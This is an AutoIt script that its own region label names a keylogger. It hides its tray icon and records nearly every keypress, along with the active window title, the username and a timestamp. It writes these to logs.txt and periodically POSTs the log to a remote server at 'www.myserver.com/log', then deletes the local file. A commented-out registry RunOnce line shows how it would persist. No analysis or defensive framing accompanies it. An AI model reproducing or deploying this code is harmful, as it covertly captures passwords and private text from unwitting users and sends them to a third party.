#Include <file.au3>
#NoTrayIcon
#region - SMTP Variables
#include <MsgBoxConstants.au3>

$postServer="www.myserver.com/log"

Opt('SendKeyDelay', 250);

hotkeyset("{f7}","get")
hotkeyset("{esc}","quit")


;If $cmdLine[1] <> "StartUp" Then
   ;RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce", "AutoItScript", "REG_SZ", @ScriptFullPath & " StartUp")
;EndIf

Func get()

    ; Retrieve the data stored in the clipboard.
    Local $sData = ClipGet()
	send($sData)



EndFunc


func quit()
    Exit
    EndFunc

$count = 1
$date=@year&@mon&@mday
$AttachFiles = @ScriptDir&"logs.txt"


Global $oMyRet[2]
Global $oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
Global $MegaByte = ('1048576')
#endregion

#region Keylogger

$UserDll = DllOpen("user32.dll")
Func _IsPressed($hexKey)
Local $aR, $bO
$aR = DllCall($UserDll, "int", "GetAsyncKeyState", "int", $hexKey)
If $aR[0] <> 0 Then
    $bO = 1
Else
    $bO = 0
EndIf

Return $bO
EndFunc

$window2=""

$log= @ScriptDir

$file = FileOpen($AttachFiles, 1)
If $file = -1 Then
Exit
EndIf
filewrite($file,$date)

$size = FileGetSize ( $AttachFiles)

Func _LogKeyPress($what2log)

	$window=wingettitle("")
	if $window=$window2 Then
	   FileWrite($file,$what2log)
	   Sleep(100)
	Else
		$window2=$window
		FileWrite($file,  @CRLF& @Year&"."&@mon&"."&@mday&"  "&@HOUR & ":" &@MIN & ":" &@SEC &@UserName &'  Window: "'& $window& '"'& $what2log)
		sleep (100)

	Endif
EndFunc


While 1
	If @SEC==59 And $size > 400 Then

		FileClose($file)
		$Count += 1
		$AttachFiles = @ScriptDir&"logs.txt"
		$file = FileRead ($AttachFiles)
		Post($file)


		;MsgBox($MB_SYSTEMMODAL, "Title", $file, 10)
		FileDelete($AttachFiles)
		$file = FileOpen($AttachFiles, 1)
	EndIf
	If _IsPressed(0xBA) = 1 Then _LogKeyPress('; ')
	If _IsPressed(0xBB) = 1 Then _LogKeyPress('= ')
	If _IsPressed(0xBC) = 1 Then _LogKeyPress(', ')
	If _IsPressed(0xBD) = 1 Then _LogKeyPress('- ')
	If _IsPressed(0xBE) = 1 Then _LogKeyPress('. ')
	If _IsPressed(0xBF) = 1 Then _LogKeyPress('/ ')
	If _IsPressed(0xC0) = 1 Then _LogKeyPress('` ')
	If _IsPressed(0xDB) = 1 Then _LogKeyPress('[ ')
	If _IsPressed(0xDC) = 1 Then _LogKeyPress('\ ')
	If _IsPressed(0xDD) = 1 Then _LogKeyPress('] ')
	If _IsPressed(0xDE) = 1 Then _LogKeyPress("' ")
	If _IsPressed(0x08) = 1 Then _LogKeyPress('{BACKSPACE}')
	If _IsPressed(0x09) = 1 Then _LogKeyPress('{TAB}')
	If _IsPressed(0x0D) = 1 Then _LogKeyPress('{ENTER}')
	If _IsPressed(0x13) = 1 Then _LogKeyPress('{PAUSE}')
	If _IsPressed(0x14) = 1 Then _LogKeyPress('{CAPSLOCK}')
	If _IsPressed(0x1B) = 1 Then _LogKeyPress('{ESC}')
	If _IsPressed(0x20) = 1 Then _LogKeyPress(' ')
	If _IsPressed(0x21) = 1 Then _LogKeyPress('{PAGE UP}')
	If _IsPressed(0x22) = 1 Then _LogKeyPress('{PAGE DOWN}')
	If _IsPressed(0x23) = 1 Then _LogKeyPress('{END}')
	If _IsPressed(0x24) = 1 Then _LogKeyPress('{HOME}')
	If _IsPressed(0x25) = 1 Then _LogKeyPress('{LEFT ARROW}')
	If _IsPressed(0x26) = 1 Then _LogKeyPress('{UP ARROW}')
	If _IsPressed(0x27) = 1 Then _LogKeyPress('{RIGHT ARROW}')
	If _IsPressed(0x28) = 1 Then _LogKeyPress('{DOWN ARROW}')
	If _IsPressed(0x2C) = 1 Then _LogKeyPress('{PRINT SCREEN}')
	If _IsPressed(0x2D) = 1 Then _LogKeyPress('{INS}')
	If _IsPressed(0x2E) = 1 Then _LogKeyPress('{DEL}')
	If _IsPressed(0x30) = 1 Then _LogKeyPress('0')
	If _IsPressed(0x31) = 1 Then _LogKeyPress('1')
	If _IsPressed(0x32) = 1 Then _LogKeyPress('2')
	If _IsPressed(0x33) = 1 Then _LogKeyPress('3')
	If _IsPressed(0x34) = 1 Then _LogKeyPress('4')
	If _IsPressed(0x35) = 1 Then _LogKeyPress('5')
	If _IsPressed(0x36) = 1 Then _LogKeyPress('6')
	If _IsPressed(0x37) = 1 Then _LogKeyPress('7')
	If _IsPressed(0x38) = 1 Then _LogKeyPress('8')
	If _IsPressed(0x39) = 1 Then _LogKeyPress('9')
	If _IsPressed(0x41) = 1 Then _LogKeyPress('a')
	If _IsPressed(0x42) = 1 Then _LogKeyPress('b')
	If _IsPressed(0x43) = 1 Then _LogKeyPress('c')
	If _IsPressed(0x44) = 1 Then _LogKeyPress('d')
	If _IsPressed(0x45) = 1 Then _LogKeyPress('e')
	If _IsPressed(0x46) = 1 Then _LogKeyPress('f')
	If _IsPressed(0x47) = 1 Then _LogKeyPress('g')
	If _IsPressed(0x48) = 1 Then _LogKeyPress('h')
	If _IsPressed(0x49) = 1 Then _LogKeyPress('i')
	If _IsPressed(0x4A) = 1 Then _LogKeyPress('j')
	If _IsPressed(0x4B) = 1 Then _LogKeyPress('k')
	If _IsPressed(0x4C) = 1 Then _LogKeyPress('l')
	If _IsPressed(0x4D) = 1 Then _LogKeyPress('m')
	If _IsPressed(0x4E) = 1 Then _LogKeyPress('n')
	If _IsPressed(0x4F) = 1 Then _LogKeyPress('o')
	If _IsPressed(0x50) = 1 Then _LogKeyPress('p')
	If _IsPressed(0x51) = 1 Then _LogKeyPress('q')
	If _IsPressed(0x52) = 1 Then _LogKeyPress('r')
	If _IsPressed(0x53) = 1 Then _LogKeyPress('s')
	If _IsPressed(0x54) = 1 Then _LogKeyPress('t')
	If _IsPressed(0x55) = 1 Then _LogKeyPress('u')
	If _IsPressed(0x56) = 1 Then _LogKeyPress('v')
	If _IsPressed(0x57) = 1 Then _LogKeyPress('w')
	If _IsPressed(0x58) = 1 Then _LogKeyPress('x')
	If _IsPressed(0x59) = 1 Then _LogKeyPress('y')
	If _IsPressed(0x5A) = 1 Then _LogKeyPress('z')
	If _IsPressed(0x5B) = 1 Then _LogKeyPress('{LEFT WIN}')
	If _IsPressed(0x5C) = 1 Then _LogKeyPress('{RIGHT WIN}')
	If _IsPressed(0x60) = 1 Then _LogKeyPress('Num 0')
	If _IsPressed(0x61) = 1 Then _LogKeyPress('Num 1')
	If _IsPressed(0x62) = 1 Then _LogKeyPress('Num 2')
	If _IsPressed(0x63) = 1 Then _LogKeyPress('Num 3')
	If _IsPressed(0x64) = 1 Then _LogKeyPress('Num 4')
	If _IsPressed(0x65) = 1 Then _LogKeyPress('Num 5')
	If _IsPressed(0x66) = 1 Then _LogKeyPress('Num 6')
	If _IsPressed(0x67) = 1 Then _LogKeyPress('Num 7')
	If _IsPressed(0x68) = 1 Then _LogKeyPress('Num 8')
	If _IsPressed(0x69) = 1 Then _LogKeyPress('Num 9')
	If _IsPressed(0x6A) = 1 Then _LogKeyPress('{MULTIPLY}')
	If _IsPressed(0x6B) = 1 Then _LogKeyPress('{ADD}')
	If _IsPressed(0x6C) = 1 Then _LogKeyPress('Separator')
	If _IsPressed(0x6D) = 1 Then _LogKeyPress('{SUBTRACT}')
	If _IsPressed(0x6E) = 1 Then _LogKeyPress('{DECIMAL}')
	If _IsPressed(0x6F) = 1 Then _LogKeyPress('{DIVIDE}')
	If _IsPressed(0x70) = 1 Then _LogKeyPress('F1 ')
	If _IsPressed(0x71) = 1 Then _LogKeyPress('F2 ')
	If _IsPressed(0x72) = 1 Then _LogKeyPress('F3 ')
	If _IsPressed(0x73) = 1 Then _LogKeyPress('F4 ')
	If _IsPressed(0x74) = 1 Then _LogKeyPress('F5 ')
	If _IsPressed(0x75) = 1 Then _LogKeyPress('F6 ')
	If _IsPressed(0x76) = 1 Then _LogKeyPress('F7 ')
	If _IsPressed(0x77) = 1 Then _LogKeyPress('F8 ')
	If _IsPressed(0x78) = 1 Then _LogKeyPress('F9 ')
	If _IsPressed(0x79) = 1 Then _LogKeyPress('F10 ')
	If _IsPressed(0x77) = 1 Then _LogKeyPress('F8 ')
	If _IsPressed(0x78) = 1 Then _LogKeyPress('F9 ')
	If _IsPressed(0x79) = 1 Then _LogKeyPress('F10 ')
	If _IsPressed(0x7A) = 1 Then _LogKeyPress('F11 ')
	If _IsPressed(0x7B) = 1 Then _LogKeyPress('F12 ')
	If _IsPressed(0x7C) = 1 Then _LogKeyPress('F13 ')
	If _IsPressed(0x7D) = 1 Then _LogKeyPress('F14 ')
	If _IsPressed(0x7E) = 1 Then _LogKeyPress('F15 ')
	If _IsPressed(0x7F) = 1 Then _LogKeyPress('F16 ')
	If _IsPressed(0x80) = 1 Then _LogKeyPress('F17 ')
	If _IsPressed(0x81) = 1 Then _LogKeyPress('F18 ')
	If _IsPressed(0x82) = 1 Then _LogKeyPress('F19 ')
	If _IsPressed(0x83) = 1 Then _LogKeyPress('F20 ')
	If _IsPressed(0x84) = 1 Then _LogKeyPress('F21 ')
	If _IsPressed(0x85) = 1 Then _LogKeyPress('F22 ')
	If _IsPressed(0x86) = 1 Then _LogKeyPress('F23 ')
	If _IsPressed(0x87) = 1 Then _LogKeyPress('F24 ')
	If _IsPressed(0x90) = 1 Then _LogKeyPress('{NUM LOCK}')
	If _IsPressed(0x91) = 1 Then _LogKeyPress('{SCROLL LOCK}')
	If _IsPressed(0xA0) = 1 Then _LogKeyPress('{LEFT SHIFT}')
	If _IsPressed(0xA1) = 1 Then _LogKeyPress('{RIGHT SHIFT}')
	If _IsPressed(0xA2) = 1 Then _LogKeyPress('{LEFT CTRL}')
	If _IsPressed(0xA3) = 1 Then _LogKeyPress('{RIGHT CTRL}')
	If _IsPressed(0xA4) = 1 Then _LogKeyPress('{LEFT ALT}')
	If _IsPressed(0xA5) = 1 Then _LogKeyPress('{RIGHT ALT}')
   sleep(100)
Wend
#endregion




Func _FileSizeMB ($File)
	$FileSizeInBytes = FileGetSize ($File)
	$Equal = $FileSizeInBytes / $MegaByte
	$Round = Round ($Equal, '2')
	Return $Round
EndFunc

Func Post($data)
	$sPD = $data

$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")

$oHTTP.Open("POST", $postServer, False)

$oHTTP.Send($sPD)
EndFunc